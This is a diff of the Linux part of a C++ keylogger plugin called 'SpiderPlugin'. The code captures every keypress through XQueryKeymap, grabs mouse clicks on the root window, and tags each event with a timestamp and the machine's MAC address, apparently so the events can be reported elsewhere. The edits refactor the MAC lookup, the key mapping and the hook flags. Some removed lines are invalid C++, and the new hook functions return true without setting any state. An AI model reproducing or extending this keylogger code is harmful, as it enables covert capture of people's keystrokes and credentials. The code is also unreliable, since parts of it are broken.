@@ -1,6 +1,7 @@
 #if defined __linux__
 
 #include "SpiderPlugin.h"
+#include "MacAddr.h"
 #include <string>
 #include <fstream>
 #include <limits>
@@ -26,7 +27,6 @@ namespace spider
   {
     namespace library
     {
-      std::string SpiderPlugin::m_macAddr = "";
 
       std::map<std::uint32_t, KeyboardKey> SpiderPlugin::m_linuxKeyboardMap = {
           {0x16, KeyboardKey::KB_BACKSPACE},
@@ -54,32 +54,32 @@ namespace spider
           {0x10, KeyboardKey::KB_7},
           {0x11, KeyboardKey::KB_8},
           {0x12, KeyboardKey::KB_9},
-          {0x18, KeyboardKey::KB_A},
-          {0x38, KeyboardKey::KB_B},
-          {0x36, KeyboardKey::KB_C},
-          {0x28, KeyboardKey::KB_D},
-          {0x1A, KeyboardKey::KB_E},
-          {0x29, KeyboardKey::KB_F},
-          {0x2A, KeyboardKey::KB_G},
-          {0x2B, KeyboardKey::KB_H},
-          {0x1F, KeyboardKey::KB_I},
-          {0x2C, KeyboardKey::KB_J},
-          {0x2D, KeyboardKey::KB_K},
-          {0x2E, KeyboardKey::KB_L},
-          {0x2F, KeyboardKey::KB_M},
-          {0x39, KeyboardKey::KB_N},
-          {0x20, KeyboardKey::KB_O},
-          {0x21, KeyboardKey::KB_P},
-          {0x26, KeyboardKey::KB_Q},
-          {0x1B, KeyboardKey::KB_R},
-          {0x27, KeyboardKey::KB_S},
-          {0x1C, KeyboardKey::KB_T},
-          {0x1E, KeyboardKey::KB_U},
-          {0x37, KeyboardKey::KB_V},
-          {0x34, KeyboardKey::KB_W},
-          {0x35, KeyboardKey::KB_X},
-          {0x1D, KeyboardKey::KB_Y},
-          {0x19, KeyboardKey::KB_Z},
+          {0x18, KeyboardKey::KB_A_MINUS},
+          {0x38, KeyboardKey::KB_B_MINUS},
+          {0x36, KeyboardKey::KB_C_MINUS},
+          {0x28, KeyboardKey::KB_D_MINUS},
+          {0x1A, KeyboardKey::KB_E_MINUS},
+          {0x29, KeyboardKey::KB_F_MINUS},
+          {0x2A, KeyboardKey::KB_G_MINUS},
+          {0x2B, KeyboardKey::KB_H_MINUS},
+          {0x1F, KeyboardKey::KB_I_MINUS},
+          {0x2C, KeyboardKey::KB_J_MINUS},
+          {0x2D, KeyboardKey::KB_K_MINUS},
+          {0x2E, KeyboardKey::KB_L_MINUS},
+          {0x2F, KeyboardKey::KB_M_MINUS},
+          {0x39, KeyboardKey::KB_N_MINUS},
+          {0x20, KeyboardKey::KB_O_MINUS},
+          {0x21, KeyboardKey::KB_P_MINUS},
+          {0x26, KeyboardKey::KB_Q_MINUS},
+          {0x1B, KeyboardKey::KB_R_MINUS},
+          {0x27, KeyboardKey::KB_S_MINUS},
+          {0x1C, KeyboardKey::KB_T_MINUS},
+          {0x1E, KeyboardKey::KB_U_MINUS},
+          {0x37, KeyboardKey::KB_V_MINUS},
+          {0x34, KeyboardKey::KB_W_MINUS},
+          {0x35, KeyboardKey::KB_X_MINUS},
+          {0x1D, KeyboardKey::KB_Y_MINUS},
+          {0x19, KeyboardKey::KB_Z_MINUS},
           // {VK_LWIN, KeyboardKey::KB_LCMD},
           // {VK_RWIN, KeyboardKey::KB_RCMD},
           // {VK_NUMPAD0, KeyboardKey::KB_0},
@@ -145,8 +145,10 @@ namespace spider
       bool SpiderPlugin::initLinux()
       {
 	// Get informations
-	getInfosLinux();
-
+        getInfosLinux();
+        // Mac Addr
+        MacAddress::get(m_macAddr);
+        
 	// Init Window and Screen
 	if (!(_Xdisplay = XOpenDisplay(NULL)))
 	  return false;
@@ -156,8 +158,6 @@ namespace spider
 	_Xroot_win = RootWindow(_Xdisplay, XScreenNumberOfScreen(screen));
 	if (!_Xroot_win)
           return false;
-        this.m_keyboardHooked = false;
-        this.m_mouseHooked = false;
 	return true;
       }
 
@@ -212,14 +212,12 @@ namespace spider
 
       bool SpiderPlugin::hookKeyboardLinux() const
       {
-        this.m_keyboardHooked = true;
-	return false;
+	return true;
       }
 
       bool SpiderPlugin::unHookKeyboardLinux() const
       {
 	// Nothing
-        this.m_keyboardHooked = false;
 	return false;
       }
 
@@ -235,37 +233,35 @@ namespace spider
 	            DefaultRootWindow(_Xdisplay), True,
 	            ButtonPressMask | ButtonReleaseMask, GrabModeSync,
 	            GrabModeSync, None, None);
-        this.m_mouseHooked = false;
-	return false;
+	return true;
       }
 
       bool SpiderPlugin::unHookMouseLinux() const
       {
 	XUngrabButton(_Xdisplay, Button1, AnyModifier, _Xroot_win);
         XUngrabButton(_Xdisplay, Button3, AnyModifier, _Xroot_win);
-        this.m_mouseHooked = false;
 	return false;
       }
 
       void SpiderPlugin::runLinux() const
       {
         // Keyboard
-        if (this.m_keyboardHooked) {
+        if (this->m_keyboardHook) {
 
                 spider::client::SystemMsg msg;
                 
-                char szKey[32];
-                char szKeyOld[32] = {0};
+                static char szKey[32];
+                static char szKeyOld[32] = { 0 };
         
-                char szBit;
-                char szBitOld;
-                int  iCheck;
+                static char szBit = 0;
+                static char szBitOld = 0;
+                static int  iCheck = 0;
         
-                char  szKeysym;
-                char *szKeyString;
+                static char  szKeysym = 0;
+                static char *szKeyString = NULL;
         
-                int iKeyCode;
-                int iReverToReturn = 0;                
+                int iKeyCode = 0;
+                int iReverToReturn = 0;
 
                 XQueryKeymap(_Xdisplay, szKey);
                 if (memcmp(szKey, szKeyOld, 32))
@@ -285,8 +281,7 @@ namespace spider
                                         msg.sys.type = SystemMsgType::EventKeyboard;
                                         msg.sys.time =
                                         static_cast<std::uint64_t>(std::time(nullptr));
-                                        std::copy(m_macAddr.begin(), m_macAddr.end(),
-                                                msg.sys.mac.data());
+                                        std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
                                         msg.sys.event.state = SystemMsgEventState::Down;
 
                                         if (m_linuxKeyboardMap.find(iKeyCode) ==
@@ -314,7 +309,7 @@ namespace spider
         }
 
         // Mouse
-        if (this.m_mouseHooked) {
+        if (this->m_mouseHook) {
                 while (XPending(_Xdisplay) > 0)
                         {
                         spider::client::SystemMsg msg;
@@ -329,8 +324,7 @@ namespace spider
 
                         msg.sys.type = SystemMsgType::EventMouse;
                         msg.sys.time = static_cast<std::uint64_t>(std::time(nullptr));
-                        std::copy(m_macAddr.begin(), m_macAddr.end(),
-                                        msg.sys.mac.data());
+                        std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
                         msg.sys.event.upper = 0;
 
                         switch (report.xbutton.button)
